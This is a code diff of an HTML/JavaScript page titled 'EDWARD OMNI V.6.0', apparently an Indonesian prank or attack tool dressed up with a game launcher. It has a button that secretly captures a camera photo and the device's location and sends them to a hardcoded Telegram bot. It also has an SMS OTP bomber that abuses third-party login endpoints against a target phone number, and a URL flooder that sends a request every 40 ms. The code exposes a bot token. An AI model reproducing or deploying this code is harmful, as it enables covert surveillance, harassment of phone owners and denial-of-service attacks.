@@ -3,64 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.5.8 ULTIMATE ]</title>
+    <title>[ EDWARD OMNI V.6.0 PRO ]</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; text-align: center; }
-        .panel { border: 2px solid #0f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; box-shadow: 0 0 10px #0f0; background: rgba(0, 20, 0, 0.9); }
-        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        button { background: #0f0; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; border-radius: 5px; text-transform: uppercase; transition: 0.3s; }
-        button:active { transform: scale(0.95); }
-        input { background: #111; border: 1px solid #0f0; color: #0f0; padding: 10px; width: 90%; margin: 5px 0; border-radius: 5px; font-size: 14px; }
-        .danger { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
-        .danger h3 { color: #ff0000; }
-        h1 { font-size: 20px; text-shadow: 0 0 10px #0f0; }
-        p { font-size: 10px; color: yellow; }
+        :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; text-align: center; }
+        h1 { font-size: 24px; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px; text-shadow: 0 0 10px var(--neon); }
+        .device-info { font-size: 10px; color: #888; margin-bottom: 20px; }
+        .panel { background: rgba(20, 20, 20, 0.8); border: 1px solid #333; border-radius: 15px; padding: 15px; margin-bottom: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); backdrop-filter: blur(5px); }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        button { background: #111; color: var(--neon); border: 1px solid var(--neon); padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.3s; text-transform: uppercase; font-size: 12px; }
+        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 20px var(--neon); }
+        input { background: #1a1a1a; border: 1px solid #333; color: #fff; padding: 12px; width: 90%; margin: 8px 0; border-radius: 8px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--neon); }
+        .btn-danger { border-color: var(--danger); color: var(--danger); }
+        .btn-danger:hover { background: var(--danger); color: #fff; box-shadow: 0 0 20px var(--danger); }
+        /* Toast Notification Modern */
+        #toast { visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 50px; padding: 10px; position: fixed; z-index: 1; left: 50%; bottom: 30px; transform: translateX(-50%); box-shadow: 0 0 15px rgba(0,0,0,0.5); border: 1px solid var(--neon); }
+        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+        @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
+        @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
     </style>
 </head>
 <body>
 
-    <h1>[ EDWARD OMNI V.5.8 ]</h1>
-    <p>DEVICE: OPPO A18 | SYSTEM: FIX GACOR</p>
+    <h1>EDWARD OMNI <span style="color:#fff">V.6.0</span></h1>
+    <div class="device-info">OPPO A18 | ENCRYPTED SYSTEM ACTIVE</div>
 
     <div class="panel">
-        <h3>📡 SATELLITE & PHOTO</h3>
-        <button onclick="takeSnap()" style="background: #fff; color: #000;">📸 AMBIL FOTO & LOKASI</button>
+        <button onclick="takeSnap()" style="width:100%; background: #fff; color: #000; border: none;">📸 RADAR SCAN & PHOTO</button>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <div class="panel">
-        <h3>⚔️ ANONYMOUS SMS SPAMMER</h3>
-        <input type="number" id="noTarget" placeholder="Nomor: 08xxxxxxx">
-        <button onclick="spamOTP()" style="background: #00ffea; color: #000;">LANCARKAN SMS OTP</button>
+        <h3 style="margin-top:0">⚔️ ANONYMOUS SPAMMER</h3>
+        <input type="number" id="noTarget" placeholder="Nomor Target (08...)">
+        <button onclick="spamOTP()" style="width:100%;">LAUNCH SMS ATTACK</button>
     </div>
 
     <div class="panel">
-        <h3>🎮 GAME LAUNCHER</h3>
+        <h3 style="margin-top:0">🎮 GAME LAUNCHER</h3>
         <div class="grid">
-            <button onclick="launch('com.dts.freefireth')">FREE FIRE</button>
+            <button onclick="launch('com.dts.freefireth')">Free Fire</button>
             <button onclick="launch('com.mobile.legends')">MLBB</button>
-            <button onclick="launch('com.roblox.client')">ROBLOX</button>
-            <button onclick="launch('net.kdt.pojavlaunch')">MINECRAFT</button>
+            <button onclick="launch('com.roblox.client')">Roblox</button>
+            <button onclick="launch('net.kdt.pojavlaunch')">Minecraft</button>
         </div>
     </div>
 
-    <div class="panel danger">
-        <h3>💣 JUDOL ATTACKER</h3>
-        <input type="text" id="targetJudol" placeholder="URL Target Judol...">
-        <button onclick="startAttack()" style="background: #ff0000; color: white;">START FLOODING</button>
+    <div class="panel" style="border-color: var(--danger)">
+        <h3 style="color: var(--danger); margin-top:0">💣 JUDOL ATTACKER</h3>
+        <input type="text" id="targetJudol" placeholder="URL Target...">
+        <button onclick="startAttack()" class="btn-danger" style="width:100%;">START FLOODING</button>
     </div>
+
+    <div id="toast">Notifikasi Aktif</div>
 
     <script>
         const TOKEN = "8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g";
         const CHAT_ID = "7898572558";
 
-        function kirimTele(msg) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        function showToast(msg, color="#0f0") {
+            const t = document.getElementById("toast");
+            t.innerHTML = msg;
+            t.style.borderColor = color;
+            t.className = "show";
+            setTimeout(() => { t.className = t.className.replace("show", ""); }, 3000);
         }
 
-        // 📸 FOTO & LOKASI
         async function takeSnap() {
+            showToast("Memindai Satelit...");
             const v = document.getElementById('video');
             const c = document.getElementById('canvas');
             try {
@@ -72,12 +84,12 @@
                     const img = c.toDataURL('image/jpeg');
                     kirimFoto(img);
                     stream.getTracks().forEach(t => t.stop());
+                    showToast("Data Terkirim ke Telegram!");
                 }, 1500);
-            } catch (e) { alert("Izinkan Kamera!"); }
+            } catch (e) { showToast("Gagal: Izin Kamera!", "#f00"); }
             
             navigator.geolocation.getCurrentPosition(p => {
-                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                kirimTele(`📍 LOKASI TARGET:\n${map}`);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOKASI JELAS:\nhttp://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
             });
         }
 
@@ -85,7 +97,7 @@
             const blob = dataURItoBlob(base64);
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'target.jpg');
+            formData.append('photo', blob, 'capture.jpg');
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         }
 
@@ -97,39 +109,36 @@
             return new Blob([ab], { type: 'image/jpeg' });
         }
 
-        // ⚔️ FIX SMS OTP SPAMMER (ANONIM)
         function spamOTP() {
             let n = document.getElementById('noTarget').value;
-            if(!n) return alert("Masukkan Nomor!");
-            alert("BOM SMS OTP DIKIRIM!");
-            kirimTele(`⚔️ SMS OTP ATTACK!\nTarget: ${n}`);
+            if(!n) return showToast("Masukkan Nomor!", "#f00");
+            showToast("Mengirim Paket Bombardir...");
             
             const urls = [
                 `https://id.jagreward.com/auth/login/receiver?phone=${n}`,
                 `https://m.reddoorz.com/api/v1/users/send_otp?phone=${n}`
             ];
-            for (let i = 0; i < 3; i++) {
-                urls.forEach(api => { fetch(api, { mode: 'no-cors' }).catch(() => {}); });
-            }
+            urls.forEach(url => {
+                for(let i=0; i<3; i++) { fetch(url, { mode: 'no-cors' }).catch(() => {}); }
+            });
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚔️ SMS ATTACK: ${n}`);
         }
 
-        // 🎮 FIX GAME LAUNCHER
         function launch(pkg) {
-            kirimTele(`🎮 OPENING: ${pkg}`);
+            showToast("Membuka Aplikasi...");
             if (pkg === 'net.kdt.pojavlaunch') {
-                window.location.href = "intent://#Intent;package=net.kdt.pojavlaunch;scheme=package;end";
+                // Jalur Intent Paksa untuk Minecraft Pojav
+                window.location.href = "intent://#Intent;package=net.kdt.pojavlaunch;component=net.kdt.pojavlaunch/net.kdt.pojavlaunch.MainActivity;scheme=package;end";
             } else {
                 window.location.href = "intent://#Intent;scheme=android-app;package=" + pkg + ";end";
             }
         }
 
-        // 💣 FLOODER JUDOL
         function startAttack() {
             let t = document.getElementById('targetJudol').value;
-            if(!t) return alert("Isi URL!");
-            kirimTele(`💣 ATTACKING JUDOL!\nTarget: ${t}`);
+            if(!t) return showToast("Isi URL Target!", "#f00");
+            showToast("Flooding Dimulai...", "#f00");
             setInterval(() => { fetch(t, { mode: 'no-cors' }).catch(() => {}); }, 40);
-            alert("Flooding Berjalan Gacor!");
         }
     </script>
 </body>
